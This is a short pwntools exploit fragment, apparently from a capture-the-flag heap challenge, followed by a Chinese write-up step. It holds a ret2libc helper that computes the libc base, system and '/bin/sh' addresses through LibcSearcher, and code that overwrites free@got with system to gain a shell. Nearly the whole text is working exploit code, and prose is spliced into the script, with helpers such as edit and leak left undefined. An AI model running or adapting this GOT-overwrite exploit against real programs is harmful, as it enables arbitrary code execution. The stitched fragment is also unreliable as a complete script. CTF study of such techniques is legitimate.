from pwn import *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
    if path == '':
        libc = LibcSearcher(func, leak)
        base = leak - libc.dump(func)
        system = base + libc.dump('system')
        binsh = base + libc.dump('str_bin_sh')
    else:
        libc = ELF(path)
        base = leak - libc.sym[func]
        system = base + libc.sym['system']
        binsh = base + libc.search('/bin/sh').next()
    return (system, binsh)

s = lambda data: p.send(str(data))

### g. 通过`LibcSearcher`计算`libc`基址，进而计算`system`函数，然后调用`edit`函数把`free@got`处`free`函数真实地址修改为`system`函数真实地址。下图中，查看`free@got`，里面确实变成了`system`函数地址（如果还想要确认`libc`基址对不对，可以用`vmmap`查看）。

```python
libc = LibcSearcher('free',free_addr)
libc_base_addr = free_addr - libc.dump('free')
leak('libc_base_addr', libc_base_addr)

system_addr = libc_base_addr + libc.dump('system')
leak('system_addr',system_addr)

edit(2,p64(system_addr))
dbg()
```
